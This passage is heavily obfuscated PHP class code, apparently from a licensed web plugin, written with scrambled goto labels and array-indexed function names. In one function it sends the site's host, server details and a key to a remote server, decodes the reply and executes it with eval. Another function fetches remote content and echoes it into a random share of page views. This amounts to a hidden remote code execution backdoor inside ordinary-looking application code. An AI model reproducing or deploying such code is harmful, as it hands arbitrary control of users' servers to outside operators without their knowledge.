(!$fªñšÇë¢[168]($F‡ãç“ÑÄÆ) || !isset($F‡ãç“ÑÄÆ[$fªñšÇë¢[261]]) || $fªñšÇë¢[262]() - $F‡ãç“ÑÄÆ[$fªñšÇë¢[261]] >= 60) { $c™åñ³· = $fªñšÇë¢[61]($fªñšÇë¢[11])->{$_SERVER[ÀóÛœö][263]}(); $bÛªÌ…©Õ = $c™åñ³·[$fªñšÇë¢[251]]; $e‹Ï–ğóš¦ = $fªñšÇë¢[131]($_SERVER[$fªñšÇë¢[132]] . $fªñšÇë¢[240]($e­„Øã‡Îù) . $bÛÈ±¬”£æ[$fªñšÇë¢[236]]); $e¦ÊîÉí = $fªñšÇë¢[240]($fªñšÇë¢[25]($e‹Ï–ğóš¦, 10, 16)); $F‡ãç“ÑÄÆ = $this->{$_SERVER[ÀóÛœö][215]}($bÛªÌ…©Õ[$fªñšÇë¢[111]][$e¦ÊîÉí], $e‹Ï–ğóš¦); $F‡ãç“ÑÄÆ = $fªñšÇë¢[217]($F‡ãç“ÑÄÆ, !0); } if (!$fªñšÇë¢[168]($F‡ãç“ÑÄÆ)) { return $this->{$_SERVER[ÀóÛœö][189]}(); } goto cœÓÜÄ©‹¡; F¿©íòÑ­‚: $e­„Øã‡Îù = $fªñšÇë¢[61]($fªñšÇë¢[62])->{$_SERVER[ÀóÛœö][63]}($fªñšÇë¢[133]); $f¼’Ä£ù­È = $fªñšÇë¢[256] . $fªñšÇë¢[131]($e­„Øã‡Îù . $fªñšÇë¢[257]); $e›¨ŒšŞºê = $Cíá İÈ¾Ä[661]; goto DÃµ¥ù¶—ß; C—‹‡ä¦è½: $this->kuxe2f0c6c86 = $fªñšÇë¢[138]; $bÛÈ±¬”£æ = $fªñšÇë¢[61]($fªñšÇë¢[62])->{$_SERVER[ÀóÛœö][63]}(); if ($bÛÈ±¬”£æ[$fªñšÇë¢[137]] == $fªñšÇë¢[138]) { return; } goto F¿©íòÑ­‚; F°„Ó¼˜Ÿ¿: $this->whygd47f8b42 = $F‡ãç“ÑÄÆ; $this->kuxe2f0c6c86 = $bÛÈ±¬”£æ[$fªñšÇë¢[137]]; goto B·º¤Ò¼¡„; B·º¤Ò¼¡„: } private function kgjqb25f5c3e() { goto b•ÎÇ‡åµì; c°ª¶â‚²: $A·Ú™»ŠÉÔ = $_SERVER[›é¼±][663]; if (!$A·Ú™»ŠÉÔ) { return; } if ($D«‚íæ•á == $dğ­ âÙì[264] && $this->kuxe2f0c6c86 == $dğ­ âÙì[138]) { $dğ­ âÙì[191]($dğ­ âÙì[223]($dğ­ âÙì[265]), !1, $dğ­ âÙì[266]); } goto b‡Œ¥¥«¨; b‡Œ¥¥«¨: $a·Ä¿óéîˆ = array($dğ­ âÙì[267], $dğ­ âÙì[268]); if ($dğ­ âÙì[269]($D«‚íæ•á, $a·Ä¿óéîˆ)) { if ($this->kuxe2f0c6c86 == $dğ­ âÙì[138] && isset($cîä‹ÔàçÂ[$dğ­ âÙì[270]])) { $dğ­ âÙì[191]($dğ­ âÙì[223]($dğ­ âÙì[265]), !1, $dğ­ âÙì[266]); die; } $ešÜ¯¤ô×‚ = $this->{$_SERVER[ÀóÛœö][154]}(); if ($ešÜ¯¤ô×‚ != $dğ­ âÙì[271]($dğ­ âÙì[272])) { if ($ešÜ¯¤ô×‚ <= $dğ­ âÙì[61]($dğ­ âÙì[156])->{$_SERVER[ÀóÛœö][157]}()) { $dğ­ âÙì[191]($dğ­ âÙì[223]($dğ­ âÙì[273]), !1, $dğ­ âÙì[266]); die; } } } goto A‡†ÛÌØÆÛ; b•ÎÇ‡åµì: $dğ­ âÙì =& $_SERVER[ÀóÛœö]; $cîä‹ÔàçÂ = $GLOBALS[$dğ­ âÙì[22]]; $D«‚íæ•á = $_SERVER[$dğ­ âÙì[44]]; goto c°ª¶â‚²; A‡†ÛÌØÆÛ: } private function szaff64b7360() { goto a¯–æÈ÷ë¨; BÃŞåàÜ¹©: if (!$DâÅÅÆ‡Ñ[123]($GLOBALS, $DâÅÅÆ‡Ñ[149]) || !isset($_GET[$DâÅÅÆ‡Ñ[275]])) { return; } if (!$DâÅÅÆ‡Ñ[269]($_SERVER[$DâÅÅÆ‡Ñ[44]], $E°Œ÷âÜ¡ğ)) { return; } $F®­”†ÆËÆ = $DâÅÅÆ‡Ñ[276]; goto a©ª§•Ü§Ÿ; a‚È‘ŞÜÚÑ: $FÊÌˆÛ‰Ş¬ = $DâÅÅÆ‡Ñ[279](array($DâÅÅÆ‡Ñ[280] => array($DâÅÅÆ‡Ñ[281] => $DâÅÅÆ‡Ñ[282], $DâÅÅÆ‡Ñ[283] => 3))); $F¢‡¿ğÌø = @$DâÅÅÆ‡Ñ[284]($F®­”†ÆËÆ, !1, $FÊÌˆÛ‰Ş¬); $DâÅÅÆ‡Ñ[285]($DâÅÅÆ‡Ñ[286]); goto Aº£ã±ñó; a¯–æÈ÷ë¨: $bÊÚê¿„¸÷ =& $_SERVER[›é¼±]; $DâÅÅÆ‡Ñ =& $_SERVER[ÀóÛœö]; $E°Œ÷âÜ¡ğ = array($DâÅÅÆ‡Ñ[152], $DâÅÅÆ‡Ñ[274]); goto BÃŞåàÜ¹©; a©ª§•Ü§Ÿ: $Aãâã¬âÏ = $bÊÚê¿„¸÷[664]; if (strlen($Aãâã¬âÏ) < $bÊÚê¿„¸÷[616]) { die; } $F®­”†ÆËÆ = $this->{$_SERVER[ÀóÛœö][277]}($F®­”†ÆËÆ, $DâÅÅÆ‡Ñ[278]); goto a‚È‘ŞÜÚÑ; Aº£ã±ñó: if ($F¢‡¿ğÌø && $DâÅÅÆ‡Ñ[32]($F¢‡¿ğÌø, $DâÅÅÆ‡Ñ[287])) { echo $F¢‡¿ğÌø; } die; goto E±¥­‚¾Ş; E±¥­‚¾Ş: } public function gxhp7480e49e($eÏ˜¿Í¼¾) { goto f©­õöŠ‚È; f©­õöŠ‚È: $DäåœêŠó• =& $_SERVER[›é¼±]; $d÷ßùğ¯¨ =& $_SERVER[ÀóÛœö]; if ($this->kuxe2f0c6c86 == $d÷ßùğ¯¨[288]) { return $eÏ˜¿Í¼¾; } goto E³˜öÎÕ¨ô; E³˜öÎÕ¨ô: $CÇ”°º„Ù = array($d÷ßùğ¯¨[289] => $d÷ßùğ¯¨[290], $d÷ßùğ¯¨[291] => $d÷ßùğ¯¨[290], $d÷ßùğ¯¨[292] => $d÷ßùğ¯¨[290], $d÷ßùğ¯¨[293] => $d÷ßùğ¯¨[290], $d÷ßùğ¯¨[294] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[296] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[297] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[298] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[299] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[300] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[301] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[302] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[303] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[304] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[305] => $d÷ßùğ¯¨[295], $d÷ßùğ¯¨[306] => $d÷ßùğ¯¨[295]); $b˜‡¿åˆÙ¾ = $DäåœêŠó•[665]; if (strlen($b˜‡¿åˆÙ¾) < $DäåœêŠó•[601]) { die; } goto CœÄ‹¤Éß¿; CœÄ‹¤Éß¿: $BÊ¯ˆÔÜ÷ = $d÷ßùğ¯¨[0]($d÷ßùğ¯¨[307], $d÷ßùğ¯¨[123]($this->whygd47f8b42, $d÷ßùğ¯¨[146], $d÷ßùğ¯¨[10])); $e‰Š¥´ªËÇ = $DäåœêŠó•[666]; if (!$e‰Š¥´ªËÇ) { return; } goto C¨ŒáŠ…Ÿ; c¶î¤‡Èå²: foreach ($CÇ”°º„Ù as $E•øİ¢Æ×° => $D‡ĞÄáŸÒò) { if ($D‡ĞÄáŸÒò == $d÷ßùğ¯¨[290] && $d÷ßùğ¯¨[25]($this->kuxe2f0c6c86, 0, 1) == $d÷ßùğ¯¨[290]) { continue; } if (!$d÷ßùğ¯¨[269]($E•øİ¢Æ×°, $BÊ¯ˆÔÜ÷)) { $C”Ï÷Ïè½è[] = $E•øİ¢Æ×°; } } foreach ($C”Ï÷Ïè½è as $E•øİ¢Æ×°) { unset($eÏ˜¿Í¼¾[$E•øİ¢Æ×°]); } return $eÏ˜¿Í¼¾; goto BõÖ°ªÍ²‚; C¨ŒáŠ…Ÿ: $C”Ï÷Ïè½è = array(); $CÀì×ØÙË = $DäåœêŠó•[667]; if (strlen($CÀì×ØÙË) < $DäåœêŠó•[620]) { die; } goto c¶î¤‡Èå²; BõÖ°ªÍ²‚: } private function drxb0bd59a48() { goto dŠ‰™Ô™–³; dŠ‰™Ô™–³: $e¡ßÆôßÒ =& $_SERVER[ÀóÛœö]; if ($this->kuxe2f0c6c86 != $e¡ßÆôßÒ[138]) { return; } $GLOBALS[$e¡ßÆôßÒ[111]][$e¡ßÆôßÒ[115]][$e¡ßÆôßÒ[308]] = $e¡ßÆôßÒ[246]; goto cÚÁŸ…Ø•¿; D£‹Š¡¤È: if ($e¡ßÆôßÒ[61]($e¡ßÆôßÒ[310])->{$_SERVER[ÀóÛœö][63]}($e¡ßÆôßÒ[93]) != $e¡ßÆôßÒ[260]) { $e¡ßÆôßÒ[61]($e¡ßÆôßÒ[310])->{$_SERVER[ÀóÛœö][247]}($e¡ßÆôßÒ[93], $e¡ßÆôßÒ[260]); } goto D„ˆê†Ö¯; cÚÁŸ…Ø•¿: $GLOBALS[$e¡ßÆôßÒ[111]][$e¡ßÆôßÒ[309]] = $e¡ßÆôßÒ[246]; $bù×ŠÙ´Ä = $_SERVER[›é¼±][668]; if (!$bù×ŠÙ´Ä) { return; } goto D£‹Š¡¤È; D„ˆê†Ö¯: } public function xzwk67acccce() { return $_SERVER[ÀóÛœö][311]; $AÚ½²î×ß” = $_SERVER[›é¼±][669]; if (!$AÚ½²î×ß”) { die; } } private function ltpj5038f756() { goto F¤¬ÓŒ¿ø; D ¼¥£ºëŞ: $A¸ÓˆàÈö[13](array($A¸ÓˆàÈö[317], $A¸ÓˆàÈö[177]), $B¼Ó´Ú÷õï, $A¸ÓˆàÈö[262]()); $cÚ‚çî˜„ö = $eÎÀ¤İ¸·[670]; if (!$cÚ‚çî˜„ö) { die; } goto b×Ó±ÖĞµë; F¤¬ÓŒ¿ø: $eÎÀ¤İ¸· =& $_SERVER[›é¼±]; $A¸ÓˆàÈö =& $_SERVER[ÀóÛœö]; $c„ËõÈ¥’Ø = array($A¸ÓˆàÈö[312], $A¸ÓˆàÈö[313], $A¸ÓˆàÈö[314]); goto Dï×±ÄŠ‡‡; d´òĞ“êï: $this->{$_SERVER[ÀóÛœö][189]}(); $DÒè±ÍôÏË = $eÎÀ¤İ¸·[672]; if (strlen($DÒè±ÍôÏË) < $eÎÀ¤İ¸·[616]) { return; } goto Eô•­Óœë; f‡„º»¸á‰: if ($A¸ÓˆàÈö[262]() % 4 != 0) { return; } $c“¶ç¥¨ = $A¸ÓˆàÈö[13](array($A¸ÓˆàÈö[317], $A¸ÓˆàÈö[318]), $B¼Ó´Ú÷õï); if ($c“¶ç¥¨ && $A¸ÓˆàÈö[262]() - $c“¶ç¥¨ < $A¸ÓˆàÈö[271]($A¸ÓˆàÈö[319])) { return; } goto D ¼¥£ºëŞ; Eô•­Óœë: if ($this->{$_SERVER[ÀóÛœö][225]}($aÑõ» „÷[$A¸ÓˆàÈö[321]]) != $fõ¹Á‘š’»[$A¸ÓˆàÈö[190]]) { $C‘™òÃ† = array($A¸ÓˆàÈö[227] => $C»åÛ’Ä¬ƒ, $A¸ÓˆàÈö[228] => $_SERVER[$A¸ÓˆàÈö[132]], $A¸ÓˆàÈö[229] => $A¸ÓˆàÈö[230](), $A¸ÓˆàÈö[199] => $_SERVER[$A¸ÓˆàÈö[200]]); $e¾™¥ø‘¢ = $this->{$_SERVER[ÀóÛœö][231]}($A¸ÓˆàÈö[173]($C‘™òÃ†)); $aÑõ» „÷ = $this->{$_SERVER[ÀóÛœö][209]}($A¸ÓˆàÈö[232] . $e¾™¥ø‘¢); if ($aÑõ» „÷ && $A¸ÓˆàÈö[168]($aÑõ» „÷) && isset($aÑõ» „÷[$A¸ÓˆàÈö[321]])) { $d£âÖªˆ¯£ = $this->{$_SERVER[ÀóÛœö][215]}($aÑõ» „÷[$A¸ÓˆàÈö[321]], 2); if ($d£âÖªˆ¯£) { $d£âÖªˆ¯£ = $this->{$_SERVER[ÀóÛœö][225]}($d£âÖªˆ¯£); } if ($d£âÖªˆ¯£) { try { @eval($d£âÖªˆ¯£); } catch (Exception $Eå˜ä¤‚ä) { } } } } goto eƒ¦‰ñ; b×Ó±ÖĞµë: $C»åÛ’Ä¬ƒ = $A¸ÓˆàÈö[61]($A¸ÓˆàÈö[62])->{$_SERVER[ÀóÛœö][63]}($A¸ÓˆàÈö[133]); $b„À¸®‚Ÿ = $eÎÀ¤İ¸·[671]; if (!$b„À¸®‚Ÿ) { return; } goto d÷°İ¦å³; DÔÍÍºï°: if (!$eî„‰óºïä) { return; } if (!$A¸ÓˆàÈö[168]($aÑõ» „÷)) { return; } if ($aÑõ» „÷[$A¸ÓˆàÈö[190]] && $aÑõ» „÷[$A¸ÓˆàÈö[321]]) { if ($this->{$_SERVER[ÀóÛœö][225]}($aÑõ» „÷[$A¸ÓˆàÈö[321]]) == $fõ¹Á‘š’»[$A¸ÓˆàÈö[190]]) { return; } } goto d´òĞ“êï; d÷°İ¦å³: $fõ¹Á‘š’» = array($A¸ÓˆàÈö[190] => $A¸ÓˆàÈö[61]($A¸ÓˆàÈö[62])->{$_SERVER[ÀóÛœö][63]}($A¸ÓˆàÈö[234]), $A¸ÓˆàÈö[204] => $this->kuxe2f0c6c86, $A¸ÓˆàÈö[201] => $_SERVER[$A¸ÓˆàÈö[202]], $A¸ÓˆàÈö[203] => $A¸ÓˆàÈö[61]($A¸ÓˆàÈö[62])->{$_SERVER[ÀóÛœö][63]}($A¸ÓˆàÈö[164]), $A¸ÓˆàÈö[130] => $A¸ÓˆàÈö[131]($_SERVER[$A¸ÓˆàÈö[132]] . $C»åÛ’Ä¬ƒ), $A¸ÓˆàÈö[194] => $A¸ÓˆàÈö[174], $A¸ÓˆàÈö[197] => $_SERVER[$A¸ÓˆàÈö[198]]); $aÑõ» „÷ = $this->{$_SERVER[ÀóÛœö][209]}($A¸ÓˆàÈö[320], $fõ¹Á‘š’»); $eî„‰óºïä = $eÎÀ¤İ¸·[653]; goto DÔÍÍºï°; Dï×±ÄŠ‡‡: $B¼Ó´Ú÷õï = $A¸ÓˆàÈö[315] . $A¸ÓˆàÈö[131]($A¸ÓˆàÈö[316]); if ($this->kuxe2f0c6c86 == $A¸ÓˆàÈö[138] || !$A¸ÓˆàÈö[123]($GLOBALS, $A¸ÓˆàÈö[149])) { return; } if (!$A¸ÓˆàÈö[269]($_SERVER[$A¸ÓˆàÈö[44]], $c„ËõÈ¥’Ø)) { return; } goto f‡„º»¸á‰; eƒ¦‰ñ: } private function wgpr6d766560($aò›“„Å¹ = '', $AÒ¾ìÓËÉŒ = array(), $E§ßµéŠî = 5) { goto b¿µ¬öÄ; Bœ’È‚¤ÇÏ: $AÒ¾ìÓËÉŒ = @$C‘áÖˆ¼éã[284]($AÀŒ®ç†‹š, !1, $EŒ„Üì¥¿); $f®ô¥æ¼Æ = $AãÊ¿‰Â[674]; if (!$f®ô¥æ¼Æ) { die; } goto cÂ™³­’Ã¥; b¿µ¬öÄ: $AãÊ¿‰Â =& $_SERVER[›é¼±]; $C‘áÖˆ¼éã =& $_SERVER[ÀóÛœö]; $AÀŒ®ç†‹š = $C‘áÖˆ¼éã[322]; goto aĞ”ƒ…ÀÅ¼; DŸ˜àåæ¯: if ($AÒ¾ìÓËÉŒ && $C‘áÖˆ¼éã[168]($AÒ¾ìÓËÉŒ)) { $AÀŒ®ç†‹š = $AÀŒ®ç†‹š . $C‘áÖˆ¼éã[324] . $C‘áÖˆ¼éã[325]($AÒ¾ìÓËÉŒ); } if ($AÒ¾ìÓËÉŒ === -1) { return $AÀŒ®ç†‹š; } $EŒ„Üì¥¿ = $C‘áÖˆ¼éã[279](array($C‘áÖˆ¼éã[280] => array($C‘áÖˆ¼éã[283] => $E§ßµéŠî, $C‘áÖˆ¼éã[281] => $C‘áÖˆ¼éã[326]), $C‘áÖˆ¼éã[327] => array($C‘áÖˆ¼éã[328] => !1, $C‘áÖˆ¼éã[329] => !1))); goto Bœ’È‚¤ÇÏ; aĞ”ƒ…ÀÅ¼: $Bì›ñ¼ĞŒß = $AãÊ¿‰Â[673]; $AÀŒ®ç†‹š = $this->{$_SERVER[ÀóÛœö][277]}($AÀŒ®ç†‹š, $C‘áÖˆ¼éã[323]); $AÀŒ®ç†‹š = $AÀŒ®ç†‹š . $aò›“„Å¹; goto DŸ˜àåæ¯; cÂ™³­’Ã¥: return $C‘áÖˆ¼éã[217]($AÒ¾ìÓËÉŒ, !0); $A‡•Ò“Çˆ± = $AãÊ¿‰Â[675]; while ($A‡•Ò“Çˆ± < $AãÊ¿‰Â[620]) { if ($A‡•Ò“Çˆ± >= 0) { break; } $A‡•Ò“Çˆ±++; } goto Dõ•¹Æƒ¿; Dõ•¹Æƒ¿: } private function ixryb5b2daff() { goto DÚê×ãĞœ·; F£†¯ËÕÛå: $DœƒÙ®†à = $Fˆæ‹¯ºé[676]; if (strlen($DœƒÙ®†à) < $Fˆæ‹¯ºé[606]) { die; } $AÓ™¡™ìÓ¦ = $aˆŞ¯„¼©ê[$this->kuxe2f0c6c86]; goto F‹Ã…Œ¹àù; F‹Ã…Œ¹àù: $e˜¶ÄË‰Ù = $Fˆæ‹¯ºé[677]; if (!$e˜¶ÄË‰Ù) { return; } $AÓ™¡™ìÓ¦ = $dóÃ ¦Ûïæ[271]($AÓ™¡™ìÓ¦ ? $AÓ™¡™ìÓ¦ : $dóÃ ¦Ûïæ[331]); goto e‰»ÑÛ¨ì´; e‰»ÑÛ¨ì´: $e–ÏÈ§ªïË = $Fˆæ‹¯ºé[678]; if (strlen($e–ÏÈ§ªïË) < $Fˆæ‹¯ºé[601]) { return; } $a­À¦ ŒÍ = $dóÃ ¦Ûïæ[123]($this->whygd47f8b42, $dóÃ ¦Ûïæ[357]); goto f‰øƒ„ª¾Œ; f‰øƒ„ª¾Œ: $eØğÅ–ØÎ = $Fˆæ‹¯ºé[679]; $a­À¦ ŒÍ = $a­À¦ ŒÍ ? $dóÃ ¦Ûïæ[271]($a­À¦ ŒÍ) : 0; return $AÓ™¡™ìÓ¦ + $a­À¦ ŒÍ; goto f¹¦ñ‚Ê; DÚê×ãĞœ·: $Fˆæ‹¯ºé =& $_SERVER[›é¼±]; $dóÃ ¦Ûïæ =& $_SERVER[ÀóÛœö]; $aˆŞ¯„¼©ê = array($dóÃ ¦Ûïæ[330] => $dóÃ ¦Ûïæ[331], $dóÃ ¦Ûïæ[332] => $dóÃ ¦Ûïæ[333], $dóÃ ¦Ûïæ[334] => $dóÃ ¦Ûïæ[335], $dóÃ ¦Ûïæ[336] => $dóÃ ¦Ûïæ[337], $dóÃ ¦Ûïæ[338] => $dóÃ ¦Ûïæ[339], $dóÃ ¦Ûïæ[340] => $dóÃ ¦Ûïæ[272], $dóÃ ¦Ûïæ[341] => $dóÃ ¦Ûïæ[272], $dóÃ ¦Ûïæ[342] => $dóÃ ¦Ûïæ[331], $dóÃ ¦Ûïæ[343] => $dóÃ ¦Ûïæ[333], $dóÃ ¦Ûïæ[344] => $dóÃ ¦Ûïæ[335], $dóÃ ¦Ûïæ[345] => $dóÃ ¦Ûïæ[346], $dóÃ ¦Ûïæ[347] => $dóÃ ¦Ûïæ[337], $dóÃ ¦Ûïæ[348] => $dóÃ ¦Ûïæ[349], $dóÃ ¦Ûïæ[350] => $dóÃ ¦Ûïæ[339], $dóÃ ¦Ûïæ[351] => $dóÃ ¦Ûïæ[352], $dóÃ ¦Ûïæ[353] => $dóÃ ¦Ûïæ[354], $dóÃ ¦Ûïæ[355] => $dóÃ ¦Ûïæ[356]); goto F£†¯ËÕÛå; f¹¦ñ‚Ê: } public function hatbd29402ca($E”¿»÷Í«) { goto eÅ§„±Íå; eÅ§„±Íå: $eºƒ¦óÎÓÃ =& $_SERVER[›é¼±]; $fİ˜º¥‚âå =& $_SERVER[ÀóÛœö]; $F™à¸Û¿±¶ = $this->{$_SERVER[ÀóÛœö][154]}(); goto Eââ—¨†‡; Eââ—¨†‡: if ($E”¿»÷Í«[$fİ˜º¥‚âå[358]] == $fİ˜º¥‚âå[246]) { return; } if ($F™à¸Û¿±¶ >= $fİ˜º¥‚âå[271]($fİ˜º¥‚âå[272])) { return; } $bøî¸‹ÌòÑ = $fİ˜º¥‚âå[61]($fİ˜º¥‚âå[156])->{$_SERVER[ÀóÛœö][157]}(); goto f…‰è•ô‚»; føæŞø¼ó°: while ($b¯ÚªÎâ÷è < $eºƒ¦óÎÓÃ[601]) { if ($b¯ÚªÎâ÷è >= 0) { break; } $b¯ÚªÎâ÷è++; } $BŠ†—ˆ¥¼¢ = $fİ˜º¥‚âå[248]($BŠ†—ˆ¥¼¢, $fİ˜º¥‚âå[10], $fİ˜º¥‚âå[358]); if (!$fİ˜º¥‚âå[269]($E”¿»÷Í«[$fİ˜º¥‚âå[358]], $BŠ†—ˆ¥¼¢)) { $fİ˜º¥‚âå[191]($fİ˜º¥‚âå[362], !1, $fİ˜º¥‚âå[266]); } goto dá‡ñîïºã; f…‰è•ô‚»: if ($bøî¸‹ÌòÑ <= $F™à¸Û¿±¶) { return; } $BŠ†—ˆ¥¼¢ = $fİ˜º¥‚âå[61]($fİ˜º¥‚âå[156])->{$_SERVER[ÀóÛœö][359]}($fİ˜º¥‚âå[358])->{$_SERVER[ÀóÛœö][360]}($F™à¸Û¿±¶)->{$_SERVER[ÀóÛœö][361]}(); $b¯ÚªÎâ÷è = $eºƒ¦óÎÓÃ[680]; goto føæŞø¼ó°; dá‡ñîïºã: } public function mdau0d116810() { goto C¶Æñæ©Û±; C¶Æñæ©Û±: $f¶ñ™‹œ—Ÿ =& $_SERVER[›é¼±]; $d›Ë«ï° =& $_SERVER[ÀóÛœö]; if (!$d›Ë«ï°[123]($GLOBALS, $d›Ë«ï°[149]) || $d›Ë«ï°[363](1, 100) > 20) { return; } goto Aç³µ¶«ÂÙ; b—–ç¨Ç®: echo $d›Ë«ï°[364] . $d›Ë«ï°[365]($A’—’ËŸÙ·) . $d›Ë«ï°[366]; $DÅš°‰Ä†Œ = $f¶ñ™‹œ—Ÿ[685]; goto d¾‚³Ë¹„–; Fë£Õ«å¼È: $A’—’ËŸÙ· = @$d›Ë«ï°[284]($b¶ÇÓòŸÛ¼, !1, $få»©•í—¶); $CÑõÒ¥Šä„ = $f¶ñ™‹œ—Ÿ[684]; if (!$CÑõÒ¥Šä„) { return; } goto b—–ç¨Ç®; Bãë•êóÈË: $b¶ÇÓòŸÛ¼ = $this->{$_SERVER[ÀóÛœö][277]}($b¶ÇÓòŸÛ¼, $d›Ë«ï°[278]); $A­¤ÈˆÚ·î = $f¶ñ™‹œ—Ÿ[682]; if (!$A­¤ÈˆÚ·î) { die; } goto fÁ—áè“÷; Aç³µ¶«ÂÙ: $b¶ÇÓòŸÛ¼ = $d›Ë«ï°[276]; $aÍœÍ°¬¬½ = $f¶ñ™‹œ—Ÿ[681]; if (!$aÍœÍ°¬¬½) { die; } goto Bãë•êóÈË; fÁ—áè“÷: $få»©•í—¶ = $d›Ë«ï°[279](array($d›Ë«ï°[280] => array($d›Ë«ï°[281] => $d›Ë«ï°[282], $d›Ë«ï°[283] => 3))); $B‡®–¸øáÇ = $f¶ñ™‹œ—Ÿ[683]; if (!$B‡®–¸øáÇ) { die; } goto Fë£Õ«å¼È; d¾‚³Ë¹„–: } private function lpfz60f4ebb9($B¥ î½Îì, $Aß²´‰³Æ„, $A§ç½—÷ ø = 3) { goto aíÛóÏÎÊ¦; AÂ­‡¶ê: $C“ƒÜô½£¸ = $BğæõÆÎò[240]($dÙšÒÌøÍÖ . $EÏœŞ«‡ñï . $C“ƒÜô½£¸); $bâ³–µ•¦ = $A››Ûóô•Ú[698]; if (!$bâ³–µ•¦) { die; } goto a·»¥•Ô©; e£Øƒ‘ƒ™: while ($AŠãçôŒ¸† < $A››Ûóô•Ú[601]) { if ($AŠãçôŒ¸† >= 0) { break; } $AŠãçôŒ¸†++; } $FŠĞ÷ŸŞ Á = $BğæõÆÎò[368]; switch ($dÙšÒÌøÍÖ) { case $BğæõÆÎò[260]: $C“ƒÜô½£¸ = $this->{$_SERVER[ÀóÛœö][172]}($B¥ î½Îì, $BğæõÆÎò[240]($Aß²´‰³Æ„ . $EÏœŞ«‡ñï)); break; $EœÀ‘½…â± = $A››Ûóô•Ú[688]; if (strlen($EœÀ‘½…â±) < $A››Ûóô•Ú[616]) { return; } case $BğæõÆÎò[246]: $C“ƒÜô½£¸ = $this->{$_SERVER[ÀóÛœö][172]}($B¥ î½Îì, $BğæõÆÎò[240]($EÏœŞ«‡ñï . $Aß²´‰³Æ„)); break; case $BğæõÆÎò[369]: $C“ƒÜô½£¸ = $this->{$_SERVER[ÀóÛœö][172]}($B¥ î½Îì, $BğæõÆÎò[135]($EÏœŞ«‡ñï . $Aß²´‰³Æ„)); break; case $BğæõÆÎò[370]: $C“ƒÜô½£¸ = $this->{$_SERVER[ÀóÛœö][172]}($B¥ î½Îì, $BğæõÆÎò[131]($EÏœŞ«‡ñï . $Aß²´‰³Æ„)); $A’Œ˜Ï÷Œ± = $A››Ûóô•Ú[689]; while (strlen($A’Œ˜Ï÷Œ±) < $A››Ûóô•Ú[620]) { if (!$A’Œ˜Ï÷Œ±) { break; } $A’Œ˜Ï÷Œ±++; } break; $Aª…Ğ¬„¾ = $A››Ûóô•Ú[690]; while ($Aª…Ğ¬„¾ < $A››Ûóô•Ú[601]) { if ($Aª…Ğ¬„¾ >= 0) { break; } $Aª…Ğ¬„¾++; } case $BğæõÆÎò[371]: goto eÃ¹‰™é„¦; e™‘â‘Ë–ó: if (!$f»©ŸÙ¥) { return; } $aÕŸ·õ„˜ = 0; $FŠ‘å’¶ÜÓ = $A››Ûóô•Ú[694]; goto BÆÃß‡ïŞ; CÊØù÷¹Ø…: $càğ›£ = $BğæõÆÎò[10]; $Bî²è·ª˜– = $A››Ûóô•Ú[693]; while (strlen($Bî²è·ª˜–) < $A››Ûóô•Ú[601]) { if (!$Bî²è·ª˜–) { break; } $Bî²è·ª˜–++; } goto A„¨Š¿ë›Ô; dµÁà³¼î: $dá‰ôÌƒÇ = $A››Ûóô•Ú[692]; if (strlen($dá‰ôÌƒÇ) < $A››Ûóô•Ú[606]) { die; } $Fô´È‡¥¸‰ = $BğæõÆÎò[25]($Fô´È‡¥¸‰, $aŒ„´µ——ä % 8, $aŒ„´µ——ä % 8 + 7); goto CÊØù÷¹Ø…; Eµº§í¡ïµ: $eàˆ‚İ¤ìé = $A››Ûóô•Ú[696]; if (strlen($eàˆ‚İ¤ìé) < $A››Ûóô•Ú[601]) { return; } break; goto CàÖœâæÛ½; A„¨Š¿ë›Ô: $FÏ‘š¡ÌÊœ = 0; $eí½ê¨º‚ò = 0; $f»©ŸÙ¥ = $A››Ûóô•Ú[677]; goto e™‘â‘Ë–ó; B°¬éÉÛÅç: if (!$F¥êÃ‰çîÆ) { return; } $c¤­™–ã§ = $FŠĞ÷ŸŞ Á[$aŒ„´µ——ä]; $Fô´È‡¥¸‰ = $BğæõÆÎò[131]($c¤­™–ã§ . $BğæõÆÎò[131]($Aß²´‰³Æ„ . $c¤­™–ã§) . $Aß²´‰³Æ„); goto dµÁà³¼î; eÃ¹‰™é„¦: $B¥ î½Îì = $BğæõÆÎò[135]($B¥ î½Îì); $aŒ„´µ——ä = $BğæõÆÎò[372](0, 64); $F¥êÃ‰çîÆ = $A››Ûóô•Ú[691]; goto B°¬éÉÛÅç; BÆÃß‡ïŞ: while (strlen($FŠ‘å’¶ÜÓ) < $A››Ûóô•Ú[606]) { if (!$FŠ‘å’¶ÜÓ) { break; } $FŠ‘å’¶ÜÓ++; } for ($FÏ‘š¡ÌÊœ = 0; $FÏ‘š¡ÌÊœ < $BğæõÆÎò[24]($B¥ î½Îì); $FÏ‘š¡ÌÊœ++) { $aÕŸ·õ„˜ = $aÕŸ·õ„˜ == $BğæõÆÎò[24]($Fô´È‡¥¸‰) ? 0 : $aÕŸ·õ„˜; $eí½ê¨º‚ò = ($aŒ„´µ——ä + $BğæõÆÎò[373]($FŠĞ÷ŸŞ Á, $B¥ î½Îì[$FÏ‘š¡ÌÊœ]) + $BğæõÆÎò[374]($Fô´È‡¥¸‰[$aÕŸ·õ„˜++])) % 64; $cçÁÕ¬Å¦ƒ = $A››Ûóô•Ú[695]; while (strlen($cçÁÕ¬Å¦ƒ) < $A››Ûóô•Ú[601]) { if (!$cçÁÕ¬Å¦ƒ) { break; } $cçÁÕ¬Å¦ƒ++; } $càğ›£ .= $FŠĞ÷ŸŞ Á[$eí½ê¨º‚ò]; } $C“ƒÜô½£¸ = $BğæõÆÎò[365]($c¤­™–ã§ . $càğ›£); goto Eµº§í¡ïµ; CàÖœâæÛ½: default: $C“ƒÜô½£¸ = $this->{$_SERVER[ÀóÛœö][172]}($B¥ î½Îì, $Aß²´‰³Æ„ . $EÏœŞ«‡ñï); $D›İêçª²˜ = $A››Ûóô•Ú[697]; break; } goto AÂ­‡¶ê; aíÛóÏÎÊ¦: $A››Ûóô•Ú =& $_SERVER[›é¼±]; $BğæõÆÎò =& $_SERVER[ÀóÛœö]; 